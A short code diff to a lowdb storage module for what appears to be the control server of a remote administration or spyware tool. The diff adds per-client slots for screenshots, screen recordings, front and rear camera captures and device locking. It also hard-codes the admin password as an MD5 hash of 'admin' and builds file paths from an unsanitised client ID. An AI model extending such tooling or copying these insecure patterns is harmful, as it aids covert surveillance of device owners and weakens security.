@@ -2,13 +2,13 @@ const
     lowdb = require('lowdb'),
     FileSync = require('lowdb/adapters/FileSync'),
     path = require('path'),
-    adapter = new FileSync(path.join(__dirname, '../maindb.json')),
+    adapter = new FileSync('./maindb.json'),
     db = lowdb(adapter);
 
 db.defaults({
     admin: {
         username: 'admin',
-        password: '',
+        password: '21232f297a57a5a743894a0e4a801fc3',
         loginToken: '',
         logs: [],
         ipLog: []
@@ -18,7 +18,7 @@ db.defaults({
 
 class clientdb {
     constructor(clientID) {
-        let cdb = lowdb(new FileSync(path.join(__dirname, '../clientData/') + clientID + '.json'))
+        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
         cdb.defaults({
             clientID,
             CommandQue: [],
@@ -36,7 +36,12 @@ class clientdb {
                 updateFrequency: 0
             },
             downloads: [],
-            currentFolder: []
+            currentFolder: [],
+            lockDevice: [],
+            screenShot: [],
+            screenRecord: [],
+            rearCam: [],
+            frontCam: []
         }).write()
         return cdb;
     }
@@ -46,5 +51,4 @@ module.exports = {
     maindb: db,
     clientdb: clientdb,
 };
-
 
